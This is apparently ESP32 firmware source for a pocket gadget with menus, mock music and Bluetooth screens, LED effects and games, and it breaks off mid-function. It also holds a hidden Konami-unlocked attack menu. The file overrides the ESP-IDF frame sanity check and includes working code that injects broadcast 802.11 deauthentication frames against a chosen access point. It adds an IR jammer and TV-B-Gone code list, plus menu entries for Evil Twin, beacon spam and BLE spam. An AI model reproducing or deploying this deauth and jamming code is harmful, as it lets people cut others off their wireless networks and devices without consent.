//  ESPocket v8.2 — Deauth bypass (raw frame sanity check override)
// ============================================================

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <math.h>
#include <Preferences.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <IRrecv.h>
#include <IRutils.h>

// ============================================================
//  Deauth bypass — override ESP-IDF sanity check
//  (requires -Wl,-zmuldefs in platformio.ini build_flags)
// ============================================================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;   // always allow — required for deauth frame injection
}

#define OLED_SDA     21
#define OLED_SCL     22
#define OLED_ADDR    0x3C
#define SCR_W        128
#define SCR_H        64

#define TOUCH_UP     32
#define TOUCH_DOWN   33
#define TOUCH_SELECT 27
#define TOUCH_BACK   4

#define IR_TX_PIN    13
#define IR_RX_PIN    14

#define TEMP_CRIT  85.0f

Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
IRsend irsend(IR_TX_PIN);
IRrecv irrecv(IR_RX_PIN);
decode_results irResults;

// ---------- Hold ----------
struct HoldState { bool down; unsigned long pressMs, lastRepeatMs; bool repeatActive; };
#define HOLD_DELAY   450
#define REPEAT_RATE  110
HoldState hUp={false,0,0,false}, hDown={false,0,0,false};
HoldState hSelect={false,0,0,false}, hBack={false,0,0,false};

// ---------- Scene ----------
enum Scene : uint8_t {
  S_MAIN, S_SONGS, S_PLAYER,
  S_BT_MENU, S_BT_SEARCH, S_BT_DEV, S_BT_CONN,
  S_LED_MENU, S_LED_FX, S_LED_MUS, S_LED_BR, S_LED_WIFI,
  S_GAMES, S_SIMON, S_LIGHTS, S_SET, S_ABOUT, S_OVERHEAT,
  S_HIDDEN, S_WIFI_H, S_BT_H, S_IR_H,
  S_WIFI_SCAN, S_WIFI_TARGET, S_MOCK,
  S_IR_LEARN, S_IR_LIST, S_IR_TX, S_IR_JAM, S_IR_TVBG,
  S_DEAUTH
};

// ---------- Forward declarations (PlatformIO strict C++) ----------
void goToScene(Scene s);
bool touched(int pin, int baseline);

Scene currentScene = S_MAIN;
unsigned long sceneStartMs = 0;
unsigned long bootMs = 0;
bool overheatLatched = false;
float lastTempC = 0;

// ---------- Main menu ----------
const char* MAIN_IT[] = {"Play","Songs","Bluetooth","Games","LED Effects","Flashlight","Settings"};
const int MAIN_COUNT = 7;
int mainSel = 0;

// ---------- Songs ----------
struct Song { const char* title; const char* artist; uint16_t dur; };
Song SONGS[] = {
  {"Tum Hi Ho","Arijit",262},{"Kesariya","Arijit",268},
  {"Apna Bana Le","Arijit",245},{"Channa Mereya","Arijit",296}
};
const int SONG_COUNT = 4;
int songSel = 0;

// ---------- BT ----------
const char* BT_M[] = {"Scan Devices","Connect Last","Forget Saved"};
const int BT_M_COUNT = 3;
int btMenuSel = 0;

struct Dev { const char* n; uint8_t t; uint8_t rssi; uint8_t mac[3]; };
Dev DEVS[] = {
  {"Super Buds GT99",0,4,{0xA4,0xC1,0x1F}},
  {"JBL Flip 5",     1,3,{0x22,0x88,0x4B}},
  {"boAt Airdopes",  0,3,{0x11,0x44,0x7E}},
  {"Soundcore Mini", 1,2,{0x88,0x1A,0x33}},
  {"Some Phone",     2,4,{0xFC,0xD0,0x55}}
};
const int DEV_COUNT = 5;
int devSel = 0;
int connDevIdx = 0;

// ---------- LED ----------
const char* LED_M[] = {"Effects","Music Sync","Brightness","WiFi Control"};
const int LED_M_COUNT = 4;
int ledMenuSel = 0;
const char* FX[] = {"Solid","Rainbow","Breathe","Chase","Color Wipe","Theater","Comet","Meteor","Pulse Wave","Twinkle","Fire","Sparkle","Scanner","Strobe","Two-Color","Gradient"};
const int FX_COUNT = 16;
int fxSel = 0;
const char* LM[] = {"Play Music","Music Bar","Music VU","Beat Pulse","Spectrum","Bass Pulse","Treble","VU Mirror","Wave Form","Freq Bars","Center Pulse","Beat Ripple"};
const int LM_COUNT = 12;
int lmSel = 0;

// ---------- Settings ----------
const char* SET_M[] = {"Display Sleep","Screen Bright","Auto BT","Factory Reset","About"};
const int SET_COUNT = 5;
int setSel = 0;

// ---------- Games ----------
const char* GAMES_M[] = {"Simon Says","Lights Out"};
const int GAMES_COUNT = 2;
int gamesSel = 0;

// ---------- Prefs ----------
Preferences prefs;
int highScore = 0;

// ---------- IR storage ----------
#define IR_MAX_SLOTS  16
#define IR_NAME_LEN   14
struct IRCode { bool valid; uint8_t protocol; uint32_t code; uint8_t bits; char name[IR_NAME_LEN]; };
IRCode irSlots[IR_MAX_SLOTS];
int irSel = 0, irLearnSlot = 0, irListSel = 0, irLastSlot = 0;

bool irJamming = false;
unsigned long irJamStart = 0, irJamCount = 0, irJamLastSend = 0;
uint8_t irJamProtoIdx = 0;
unsigned long irTvbgLast = 0;
int irTvbgIdx = 0;

const char* IR_PROTO_NAMES[] = {"NEC","Sony","Samsung","LG","JVC","RC5"};
const int IR_PROTO_COUNT = 6;
const char* IR_MENU[] = {"Learn Code","Transmit","Jammer","TV-B-Gone","Delete Slot"};
const int IR_MENU_COUNT = 5;

// ---------- Hidden menu ----------
bool hiddenUnlocked = false;
const char* HIDDEN_IT[]  = {"WiFi","BT","IR"};
const char* HIDDEN_SUB[] = {"Wireless","Bluetooth","Infrared"};
const int HIDDEN_COUNT = 3;
int hiddenSel = 0;
const char* WIFI_H_M[] = {"Scan Networks","Beacon Spam","Probe Sniffer","RF Monitor"};
const int WIFI_H_COUNT = 4;
int wifiHSel = 0;
const char* BT_H_M[] = {"BLE Scan","BLE Spam","HID Keyboard"};
const int BT_H_COUNT = 3;
int btHSel = 0;

// ---------- WiFi nets ----------
#define NET_MAX 20
struct Net {
  char ssid[33];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t ch;
  bool locked;
};
Net NETS[NET_MAX];
int NET_COUNT = 0;
int netSel = 0, targetNet = 0;
bool wifiScanDone = false;
bool wifiScanRunning = false;

// ---------- Deauth ----------
bool deauthRunning = false;
unsigned long deauthStartMs = 0;
unsigned long deauthLast = 0;
unsigned long deauthCount = 0;
#define DEAUTH_REASON 0x07

const char* WIFI_ACT_M[] = {"Deauth","Evil Twin","Beacon Spoof","Probe Flood"};
const int WIFI_ACT_COUNT = 4;
int wifiActSel = 0;

const char* mockTitle = "";
const char* mockSub   = "";
Scene mockReturnScene = S_HIDDEN;

// Konami
int konamiProgress = 0;
unsigned long konamiLastMs = 0;
const int KONAMI_CODE[] = {0,1,0,1,2};
const int KONAMI_LEN = 5;

// Touch
int baseUp=0, baseDown=0, baseSelect=0, baseBack=0;
#define TOUCH_DROP_PCT 25
unsigned long lastInput = 0;
#define INPUT_DEBOUNCE 30

// Smooth
#define SMOOTH_RATE 14.0f
float smPos = 0.0f;
unsigned long smLastMs = 0;
bool smFirst = true;
float lerpf(float a,float b,float t){return a+(b-a)*t;}
void smTick(float t){unsigned long n=millis();if(smFirst){smPos=t;smLastMs=n;smFirst=false;return;}float dt=(n-smLastMs)/1000.0f;if(dt>0.08f)dt=0.08f;float k=1.0f-expf(-SMOOTH_RATE*dt);smPos=lerpf(smPos,t,k);smLastMs=n;}
void smSnapNext(){smFirst=true;}
int animFrame = 0;

// ---------- Icons ----------
void iPlay(int x,int y,uint16_t c){display.fillTriangle(x+2,y+1,x+2,y+7,x+7,y+4,c);}
void iMusic(int x,int y,uint16_t c){display.fillCircle(x+2,y+5,2,c);display.drawFastVLine(x+3,y+1,5,c);display.drawPixel(x+4,y+1,c);display.drawPixel(x+5,y+1,c);display.drawPixel(x+6,y+2,c);display.drawPixel(x+6,y+3,c);display.drawPixel(x+5,y+3,c);}
void iBT(int x,int y,uint16_t c){display.drawFastVLine(x+4,y,8,c);display.drawLine(x+4,y,x+6,y+2,c);display.drawLine(x+6,y+2,x+2,y+4,c);display.drawLine(x+4,y+7,x+6,y+5,c);display.drawLine(x+6,y+5,x+2,y+3,c);}
void iGame(int x,int y,uint16_t c){display.drawRect(x,y+1,8,6,c);display.drawPixel(x+2,y+3,c);display.drawPixel(x+1,y+4,c);display.drawPixel(x+2,y+4,c);display.drawPixel(x+3,y+4,c);display.drawPixel(x+2,y+5,c);display.drawPixel(x+5,y+3,c);display.drawPixel(x+5,y+5,c);}
void iLED(int x,int y,uint16_t c){display.drawCircle(x+4,y+3,3,c);display.fillRect(x+3,y+6,3,2,c);display.drawPixel(x+4,y+3,c);}
void iFlash(int x,int y,uint16_t c){display.fillRect(x+2,y,4,3,c);display.fillRect(x+3,y+3,2,5,c);display.drawPixel(x,y,c);display.drawPixel(x+7,y,c);}
void iPlayL(int x,int y,uint16_t c){display.fillTriangle(x+4,y+2,x+4,y+14,x+14,y+8,c);}
void iMusicL(int x,int y,uint16_t c){display.fillCircle(x+4,y+11,3,c);display.fillCircle(x+11,y+9,3,c);display.drawFastVLine(x+6,y+3,8,c);display.drawFastVLine(x+13,y+1,8,c);display.drawFastHLine(x+6,y+1,8,c);display.drawFastHLine(x+6,y+2,8,c);}
void iBTL(int x,int y,uint16_t c){display.drawFastVLine(x+8,y,16,c);display.drawLine(x+8,y,x+14,y+4,c);display.drawLine(x+14,y+4,x+2,y+11,c);display.drawLine(x+8,y+15,x+14,y+11,c);display.drawLine(x+14,y+11,x+2,y+4,c);}
void iGameL(int x,int y,uint16_t c){display.drawRoundRect(x,y+2,16,12,4,c);display.drawPixel(x+3,y+7,c);display.drawPixel(x+5,y+7,c);display.drawPixel(x+4,y+6,c);display.drawPixel(x+4,y+8,c);display.fillCircle(x+12,y+8,2,c);display.fillCircle(x+12,y+5,2,c);}
void iLEDL(int x,int y,uint16_t c){display.drawCircle(x+8,y+6,5,c);display.fillRect(x+6,y+12,5,4,c);display.drawPixel(x+8,y+6,c);display.drawPixel(x+6,y+5,c);display.drawPixel(x+10,y+5,c);}
void iFlashL(int x,int y,uint16_t c){display.fillRect(x+5,y,6,5,c);display.fillRect(x+6,y+5,4,11,c);display.drawLine(x,y,x+3,y+3,c);display.drawLine(x+15,y,x+12,y+3,c);}
void iEarbud(int x,int y,uint16_t c){display.fillCircle(x+2,y+3,2,c);display.fillRect(x+3,y+4,1,3,c);display.fillCircle(x+6,y+3,2,c);display.fillRect(x+6,y+4,1,3,c);}
void iSpkBox(int x,int y,uint16_t c){display.drawRect(x,y+1,8,7,c);display.fillCircle(x+2,y+4,1,c);display.drawCircle(x+5,y+4,2,c);}
void iPhone(int x,int y,uint16_t c){display.drawRect(x+1,y,4,8,c);display.drawPixel(x+3,y+7,c);}
void iGear(int x,int y,uint16_t c){display.drawCircle(x+4,y+4,2,c);display.drawPixel(x+4,y,c);display.drawPixel(x+4,y+7,c);display.drawPixel(x,y+4,c);display.drawPixel(x+7,y+4,c);display.drawPixel(x+1,y+1,c);display.drawPixel(x+6,y+1,c);display.drawPixel(x+1,y+6,c);display.drawPixel(x+6,y+6,c);}
void iGearL(int x,int y,uint16_t c){display.drawCircle(x+8,y+8,4,c);display.drawCircle(x+8,y+8,6,c);display.fillRect(x+7,y,2,3,c);display.fillRect(x+7,y+13,2,3,c);display.fillRect(x,y+7,3,2,c);display.fillRect(x+13,y+7,3,2,c);display.fillRect(x+2,y+2,3,3,c);display.fillRect(x+11,y+2,3,3,c);display.fillRect(x+2,y+11,3,3,c);display.fillRect(x+11,y+11,3,3,c);}
void iWifi(int x,int y,uint16_t c){display.fillCircle(x+4,y+6,1,c);display.drawCircle(x+4,y+6,3,c);display.drawCircle(x+4,y+6,5,c);}
void iWifiL(int x,int y,uint16_t c){display.fillCircle(x+8,y+12,2,c);display.drawCircle(x+8,y+12,5,c);display.drawCircle(x+8,y+12,9,c);}

// Header
int batteryPct = 78;
void batD(int x,int y){display.drawRect(x,y,16,9,BLACK);display.fillRect(x+16,y+3,2,3,BLACK);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,BLACK);}
void batL(int x,int y){display.drawRect(x,y,16,9,WHITE);display.fillRect(x+16,y+3,2,3,WHITE);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,WHITE);}
void hdr(const char* t){int tw=strlen(t)*6;int hx=(SCR_W-(tw+8))/2;display.fillRoundRect(hx,0,tw+8,13,6,WHITE);display.setTextColor(BLACK);display.setTextSize(1);display.setCursor(hx+4,3);display.print(t);batD(SCR_W-22,2);display.setTextColor(WHITE);}
void hdrL(const char* t){int tw=strlen(t)*6;int hx=(SCR_W-(tw+8))/2;display.drawRoundRect(hx,0,tw+8,13,6,WHITE);display.setTextColor(WHITE);display.setTextSize(1);display.setCursor(hx+4,3);display.print(t);batL(SCR_W-22,2);}
void drawSignalBars(int x,int y,int s,uint16_t c){for(int i=0;i<4;i++){int h=2+i*2;int bx=x+i*3;int by=y-h+2;if(i<s)display.fillRect(bx,by,2,h,c);else display.drawRect(bx,by,2,h,c);}}
float readTempC() { return temperatureRead(); }
void saveHighScore(int score){if(score>highScore){highScore=score;prefs.putInt("hi",highScore);}}

// ============================================================
//  IR storage
// ============================================================
void irSaveSlot(int slot){
  if(slot<0||slot>=IR_MAX_SLOTS)return;
  char k[12];
  snprintf(k,sizeof(k),"ir_v_%d",slot);prefs.putBool(k,irSlots[slot].valid);
  if(!irSlots[slot].valid)return;
  snprintf(k,sizeof(k),"ir_p_%d",slot);prefs.putUChar(k,irSlots[slot].protocol);
  snprintf(k,sizeof(k),"ir_c_%d",slot);prefs.putUInt(k,irSlots[slot].code);
  snprintf(k,sizeof(k),"ir_b_%d",slot);prefs.putUChar(k,irSlots[slot].bits);
  snprintf(k,sizeof(k),"ir_n_%d",slot);prefs.putString(k,irSlots[slot].name);
}
void irLoadAll(){
  for(int i=0;i<IR_MAX_SLOTS;i++){
    char k[12];snprintf(k,sizeof(k),"ir_v_%d",i);irSlots[i].valid=prefs.getBool(k,false);
    if(!irSlots[i].valid){irSlots[i].protocol=0;irSlots[i].code=0;irSlots[i].bits=0;strncpy(irSlots[i].name,"empty",IR_NAME_LEN);continue;}
    snprintf(k,sizeof(k),"ir_p_%d",i);irSlots[i].protocol=prefs.getUChar(k,0);
    snprintf(k,sizeof(k),"ir_c_%d",i);irSlots[i].code=prefs.getUInt(k,0);
    snprintf(k,sizeof(k),"ir_b_%d",i);irSlots[i].bits=prefs.getUChar(k,0);
    snprintf(k,sizeof(k),"ir_n_%d",i);
    String n=prefs.getString(k,"code");strncpy(irSlots[i].name,n.c_str(),IR_NAME_LEN-1);irSlots[i].name[IR_NAME_LEN-1]=0;
  }
}
int irCountValid(){int c=0;for(int i=0;i<IR_MAX_SLOTS;i++)if(irSlots[i].valid)c++;return c;}
void irSendSlot(int slot){
  if(slot<0||slot>=IR_MAX_SLOTS||!irSlots[slot].valid)return;
  uint32_t c=irSlots[slot].code;
  switch(irSlots[slot].protocol){
    case 0:irsend.sendNEC(c,32);break;
    case 1:irsend.sendSony(c,irSlots[slot].bits);break;
    case 2:irsend.sendSAMSUNG(c,32);break;
    case 3:irsend.sendLG(c,irSlots[slot].bits);break;
    case 4:irsend.sendJVC(c,16,false);break;
    case 5:irsend.sendRC5(c,irSlots[slot].bits);break;
  }
}
void irSendJamBurst(){
  switch(irJamProtoIdx){
    case 0:irsend.sendNEC(irsend.encodeNEC(random(0,256),random(0,256)),32);break;
    case 1:irsend.sendSony(irsend.encodeSony(12,random(0,128),random(0,32)),12);break;
    case 2:irsend.sendSAMSUNG(random(0,0x7FFFFFFF),32);break;
    case 3:irsend.sendLG(random(0,0x0FFFFFFF),28);break;
    case 4:irsend.sendJVC(random(0,0xFFFF),16,false);break;
    case 5:irsend.sendRC5(irsend.encodeRC5(random(0,32),random(0,64)),13);break;
  }
  irJamCount++;irJamProtoIdx=(irJamProtoIdx+1)%IR_PROTO_COUNT;
}

// ---------- TV-B-Gone ----------
struct TVCode { uint8_t proto; uint32_t code; uint8_t bits; };
TVCode TV_BUILTIN[] = {
  {0,0x20DF10EF,32},{0,0x20DFC03F,32},{0,0x20DF23DC,32},
  {2,0xE0E040BF,32},{0,0xE0E040BF,32},{0,0xE0E0E01F,32},
  {1,0x2A00,15},{1,0x1500,15},{1,0x0A90,12},{1,0x2500,15},
  {0,0x400401BC,32},{0,0x400401BD,32},
  {0,0x40BF12ED,32},{0,0x02FD48B7,32},
  {0,0x10EF,16},{0,0x11EE,16},{0,0x0CF3,16},
  {5,0x0C,13},{5,0x0D,13},
  {4,0xC0E8,16},{4,0xC044,16},
  {0,0x00FF00FF,32},{0,0x00FF9867,32},{0,0x00FF18E7,32},
  {0,0x00FF5AA5,32},{0,0x00FF0CF3,32},{0,0x00FF807F,32},
  {0,0x00FF40BF,32},{0,0x00FFC03F,32},{0,0x00FFE01F,32},
  {0,0x00FF906F,32},{0,0x00FF6897,32},{0,0x00FFB04F,32},
  {0,0x00FF30CF,32},{0,0x00FF7887,32},
  {0,0x61A0F00E,32},{0,0x61A0F00F,32},
  {0,0x0808,16},{5,0x0C,13},{0,0x00FF8877,32}
};
const int TVBG_COUNT = sizeof(TV_BUILTIN)/sizeof(TVCode);

void irSendTvbgCode(int idx){
  if(idx<0||idx>=TVBG_COUNT)return;
  TVCode t=TV_BUILTIN[idx];
  switch(t.proto){
    case 0:irsend.sendNEC(t.code,32);break;
    case 1:irsend.sendSony(t.code,t.bits);break;
    case 2:irsend.sendSAMSUNG(t.code,32);break;
    case 3:irsend.sendLG(t.code,t.bits);break;
    case 4:irsend.sendJVC(t.code,16,false);break;
    case 5:irsend.sendRC5(t.code,t.bits);break;
  }
}

// ============================================================
//  Deauth
// ============================================================
void deauthSendFrame(uint8_t* dst, uint8_t* src, uint8_t* bssid) {
  uint8_t frame[26];
  frame[0] = 0xC0;
  frame[1] = 0x00;
  frame[2] = 0x00;
  frame[3] = 0x00;
  memcpy(&frame[4],  dst,   6);
  memcpy(&frame[10], src,   6);
  memcpy(&frame[16], bssid, 6);
  frame[22] = 0x00;
  frame[23] = 0x00;
  frame[24] = DEAUTH_REASON;
  frame[25] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
}

void deauthRunOnce() {
  if (targetNet < 0 || targetNet >= NET_COUNT) return;
  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t* ap = NETS[targetNet].bssid;
  deauthSendFrame(bcast, ap, ap);
  deauthSendFrame(bcast, ap, ap);
  deauthSendFrame(bcast, ap, ap);
  deauthSendFrame(bcast, ap, ap);
  deauthCount += 4;
}

void deauthStart(int netIdx) {
  if (netIdx < 0 || netIdx >= NET_COUNT) return;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(NETS[netIdx].ch, WIFI_SECOND_CHAN_NONE);
  delay(50);
  deauthRunning = true;
  deauthStartMs = millis();
  deauthLast = 0;
  deauthCount = 0;
  Serial.printf("[DEAUTH] started ch=%d\n", NETS[netIdx].ch);
}

void deauthStop() {
  deauthRunning = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  WiFi.disconnect(true);
  Serial.printf("[DEAUTH] stopped, %lu frames\n", deauthCount);
}

// ============================================================
//  SCREENS
// ============================================================
void dMain() {
  smTick((float)mainSel);
  display.clearDisplay();
  hdr("HOME");
  int cx=SCR_W/2, cy=34, spacing=50;
  for (int idx=0; idx<MAIN_COUNT; idx++) {
    float dx=((float)idx-smPos)*spacing;
    int x=cx+(int)dx;
    if (x<-30||x>SCR_W+30) continue;
    float dist=fabsf((float)idx-smPos);
    bool isCenter=dist<0.5f;
    if (isCenter) {
      display.fillRoundRect(x-20,cy-18,40,34,8,WHITE);
      int bx=x-8, by=cy-10;
      switch(idx){case 0:iPlayL(bx,by,BLACK);break;case 1:iMusicL(bx,by,BLACK);break;case 2:iBTL(bx,by,BLACK);break;case 3:iGameL(bx,by,BLACK);break;case 4:iLEDL(bx,by,BLACK);break;case 5:iFlashL(bx,by,BLACK);break;case 6:iGearL(bx,by,BLACK);break;}
    } else {
      display.drawRoundRect(x-12,cy-10,24,20,5,WHITE);
      int ix=x-4, iy=cy-8;
      switch(idx){case 0:iPlay(ix,iy,WHITE);break;case 1:iMusic(ix,iy,WHITE);break;case 2:iBT(ix,iy,WHITE);break;case 3:iGame(ix,iy,WHITE);break;case 4:iLED(ix,iy,WHITE);break;case 5:iFlash(ix,iy,WHITE);break;case 6:iGear(ix,iy,WHITE);break;}
    }
  }
  int dotY=60, sp2=7;
  int totalW=(MAIN_COUNT-1)*sp2;
  int startX=(SCR_W-totalW)/2;
  for (int i=0;i<MAIN_COUNT;i++){int dx=startX+i*sp2;if(i==mainSel)display.fillCircle(dx,dotY,2,WHITE);else display.drawCircle(dx,dotY,1,WHITE);}
  display.display();
}

void dSongs() {
  const int visRows=3, rowH=16, baseY=20;
  int targetOff=(songSel>=1)?(songSel-1):0;
  if (targetOff+visRows>SONG_COUNT) targetOff=SONG_COUNT-visRows;
  if (targetOff<0) targetOff=0;
  smTick((float)targetOff);
  display.clearDisplay();
  int idxLo=(int)floorf(smPos)-1, idxHi=(int)floorf(smPos)+visRows+1;
  for (int si=idxLo; si<=idxHi; si++) {
    if (si<0||si>=SONG_COUNT) continue;
    float yf=baseY+(si-smPos)*rowH;
    if (yf<baseY-rowH||yf>baseY+visRows*rowH) continue;
    int y=(int)roundf(yf);
    bool isSel=(si==songSel);
    if (isSel) { display.fillRoundRect(2,y,SCR_W-4,rowH-2,5,WHITE); display.setTextColor(BLACK); iMusic(6,y+3,BLACK); }
    else       { display.drawRoundRect(2,y,SCR_W-4,rowH-2,5,WHITE); display.setTextColor(WHITE); iMusic(6,y+3,WHITE); }
    display.setTextSize(1);
    char b[18]; snprintf(b,sizeof(b),"%.14s",SONGS[si].title);
    display.setCursor(18,y+4); display.print(b);
  }
  hdr("TRACKS");
  display.display();
}

void dPlayer() {
  display.clearDisplay();
  hdrL("PLAYING");
  display.drawRoundRect(4,18,24,24,4,WHITE); iMusic(12,26,WHITE);
  display.setTextSize(1); display.setTextColor(WHITE);
  display.setCursor(34,20); display.print(SONGS[songSel].title);
  display.setCursor(34,30); display.print(SONGS[songSel].artist);
  for(int i=0;i<4;i++){int h=2+((animFrame*(i+1))%12);display.fillRect(100+i*5,42-h,3,h,WHITE);}
  int elapsed=(animFrame/4)%SONGS[songSel].dur;
  int bx=4,by=50,bw=120;
  display.drawRoundRect(bx,by,bw,4,2,WHITE);
  int fw=(elapsed*bw)/SONGS[songSel].dur;
  if(fw>0) display.fillRoundRect(bx,by,fw,4,2,WHITE);
  char tb[12]; snprintf(tb,sizeof(tb),"%d:%02d",elapsed/60,elapsed%60);
  display.setCursor(4,56); display.print(tb);
  char tb2[12]; snprintf(tb2,sizeof(tb2),"%d:%02d",SONGS[songSel].dur/60,SONGS[songSel].dur%60);
  display.setCursor(102,56); display.print(tb2);
  display.display();
}

void dBtMenu() {
  const int rowH=10, baseY=14;
  smTick((float)btMenuSel);
  display.clearDisplay();
  hdr("BLUETOOTH");
  float pillY=baseY+smPos*rowH;
  display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
  for (int idx=0; idx<BT_M_COUNT; idx++) {
    int y=baseY+idx*rowH;
    bool isSel=(idx==btMenuSel);
    display.setTextColor(isSel?BLACK:WHITE);
    display.setTextSize(1);
    iBT(6,y+1,isSel?BLACK:WHITE);
    display.setCursor(20,y+1); display.print(BT_M[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

void dBtSearch() {
  display.clearDisplay();
  hdrL("SCANNING");
  int cx=SCR_W/2, cy=34;
  for (int ring=0; ring<3; ring++) {
    int r=((animFrame*2)+ring*15)%45;
    if (r<4) continue;
    uint16_t c=(r<15)?WHITE:((r<30)?0x7BEF:0x39E7);
    display.drawCircle(cx,cy,r,c);
    if (r>8) display.drawCircle(cx,cy,r-1,c);
  }
  display.fillCircle(cx,cy,3,WHITE);
  float ang=animFrame*0.12f;
  for (int len=6; len<40; len+=2) {
    int sx=cx+(int)(cos(ang)*len), sy=cy+(int)(sin(ang)*len);
    if (sx>=0&&sx<SCR_W&&sy>=20&&sy<56){display.drawPixel(sx,sy,WHITE);if(len<25)display.drawPixel(sx-1,sy,0x7BEF);}
  }
  display.setTextSize(1); display.setTextColor(WHITE);
  display.setCursor(4,57); display.print("Scanning");
  int dots=(animFrame/4)%4;for(int i=0;i<dots;i++)display.print(".");
  display.display();
}

void dBtDev() {
  const int visRows=2, cardH=20, gap=2, baseY=18;
  int targetOff=(devSel>=1)?(devSel-1):0;
  if (targetOff+visRows>DEV_COUNT) targetOff=DEV_COUNT-visRows;
  if (targetOff<0) targetOff=0;
  smTick((float)targetOff);
  display.clearDisplay();
  int idxLo=(int)floorf(smPos)-1, idxHi=(int)floorf(smPos)+visRows+1;
  for (int idx=idxLo; idx<=idxHi; idx++) {
    if (idx<0||idx>=DEV_COUNT) continue;
    float yf=baseY+(idx-smPos)*(cardH+gap);
    if (yf<baseY-cardH||yf>baseY+visRows*(cardH+gap)) continue;
    int y=(int)roundf(yf);
    bool isSel=(idx==devSel);
    if (isSel) { display.fillRoundRect(2,y,SCR_W-4,cardH,6,WHITE); display.fillRoundRect(0,y,4,cardH,2,WHITE); }
    else       { display.drawRoundRect(2,y,SCR_W-4,cardH,6,WHITE); }
    uint16_t c=isSel?BLACK:WHITE;
    switch(DEVS[idx].t){case 0:iEarbud(8,y+2,c);break;case 1:iSpkBox(8,y+2,c);break;case 2:iPhone(8,y+2,c);break;}
    display.setTextSize(1); display.setTextColor(c);
    char b[20]; snprintf(b,sizeof(b),"%.15s",DEVS[idx].n);
    display.setCursor(22,y+2); display.print(b);
    char mac[20]; snprintf(mac,sizeof(mac),"%02X:%02X:%02X:..",DEVS[idx].mac[0],DEVS[idx].mac[1],DEVS[idx].mac[2]);
    display.setCursor(22,y+11); display.print(mac);
    drawSignalBars(SCR_W-22,y+cardH-4,DEVS[idx].rssi,c);
  }
  hdrL("FOUND DEVICES");
  display.display();
}

void dBtConn() {
  display.clearDisplay();
  int cx=SCR_W/2, cy=32, hexR=20;
  float angleStep=6.2832f/6.0f;
  for (int i=0;i<6;i++) {
    float a1=i*angleStep-1.5708f, a2=(i+1)*angleStep-1.5708f;
    int x1=cx+(int)(cos(a1)*hexR), y1=cy+(int)(sin(a1)*hexR);
    int x2=cx+(int)(cos(a2)*hexR), y2=cy+(int)(sin(a2)*hexR);
    display.drawLine(x1,y1,x2,y2,0x39E7);
  }
  float t=(millis()-sceneStartMs)/3500.0f;
  if (t>1.0f) t=1.0f;
  float e=1.0f-(1.0f-t)*(1.0f-t)*(1.0f-t);
  int prog=(int)roundf(e*100.0f);
  float totalAngle=(prog/100.0f)*6.2832f;
  for (float a=-1.5708f; a<-1.5708f+totalAngle; a+=0.08f) {
    int px=cx+(int)(cos(a)*(hexR+4)), py=cy+(int)(sin(a)*(hexR+4));
    display.drawPixel(px,py,WHITE); display.drawPixel(px+1,py,WHITE);
  }
  display.drawCircle(cx,cy,hexR+4,0x18E3);
  display.fillRect(0,0,SCR_W,13,BLACK);
  display.setTextSize(1); display.setTextColor(WHITE);
  const char* name=DEVS[connDevIdx].n;
  int nw=strlen(name)*6;
  display.setCursor((SCR_W-nw)/2,4); display.print(name);
  char pbuf[8]; snprintf(pbuf,sizeof(pbuf),"%d%%",prog);
  display.setCursor(4,57); display.print(pbuf);
  const char* st=(prog>=100)?"CONNECTED":"CONNECTING";
  int sw=strlen(st)*6;
  display.setCursor(SCR_W-sw-4,57); display.print(st);
  display.display();
}

void dLedMenu() {
  const int rowH=10, baseY=14;
  smTick((float)ledMenuSel);
  display.clearDisplay();
  hdr("LED EFFECTS");
  float pillY=baseY+smPos*rowH;
  display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
  for (int idx=0; idx<LED_M_COUNT; idx++) {
    int y=baseY+idx*rowH;
    bool isSel=(idx==ledMenuSel);
    display.setTextColor(isSel?BLACK:WHITE);
    display.setTextSize(1);
    if (idx==3) iBT(6,y+1,isSel?BLACK:WHITE);
    else        iLED(6,y+1,isSel?BLACK:WHITE);
    display.setCursor(20,y+1); display.print(LED_M[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

void dLedFx() {
  const int visRows=4, rowH=11, baseY=16;
  int targetOff=(fxSel>=2)?(fxSel-1):0;
  if (targetOff+visRows>FX_COUNT) targetOff=FX_COUNT-visRows;
  if (targetOff<0) targetOff=0;
  smTick((float)targetOff);
  display.clearDisplay();
  hdr("EFFECTS");
  float pillYf=baseY+(fxSel-smPos)*rowH;
  if (pillYf>baseY-rowH && pillYf<baseY+visRows*rowH)
    display.fillRoundRect(2,(int)roundf(pillYf),SCR_W-4,rowH-1,3,WHITE);
  int idxLo=(int)floorf(smPos)-1, idxHi=(int)floorf(smPos)+visRows+1;
  for (int idx=idxLo; idx<=idxHi; idx++) {
    if (idx<0||idx>=FX_COUNT) continue;
    float yf=baseY+(idx-smPos)*rowH;
    if (yf<baseY-rowH||yf>baseY+visRows*rowH) continue;
    int y=(int)roundf(yf);
    display.setTextColor((idx==fxSel)?BLACK:WHITE);
    display.setTextSize(1);
    display.setCursor(12,y+2); display.print(FX[idx]);
  }
  display.setTextColor(WHITE);
  display.display();
}

void dLedMus() {
  const int visRows=4, rowH=11, baseY=16;
  int targetOff=(lmSel>=2)?(lmSel-1):0;
  if (targetOff+visRows>LM_COUNT) targetOff=LM_COUNT-visRows;
  if (targetOff<0) targetOff=0;
  smTick((float)targetOff);
  display.clearDisplay();
  hdr("MUSIC SYNC");
  float pillYf=baseY+(lmSel-smPos)*rowH;
  if (pillYf>baseY-rowH && pillYf<baseY+visRows*rowH)
